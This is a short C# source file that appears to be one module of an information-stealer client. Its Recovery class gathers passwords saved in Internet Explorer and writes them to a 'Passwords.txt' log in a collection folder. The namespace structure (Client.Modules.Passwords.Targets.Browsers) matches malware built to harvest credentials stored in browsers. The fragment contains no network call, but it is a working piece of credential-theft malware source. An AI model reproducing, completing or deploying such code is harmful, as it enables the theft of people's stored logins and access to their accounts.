using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Internet_Explorer;

internal sealed class Recovery
{
	public static void Run(string sSavePath)
	{
		List<Password> list = cPasswords.Get();
		if (list.Count != 0)
		{
			Directory.CreateDirectory(sSavePath + "\\InternetExplorer_Logs");
			cBrowserUtils.WritePasswords(list, sSavePath + "\\InternetExplorer_Logs\\Passwords.txt");
		}
	}
}
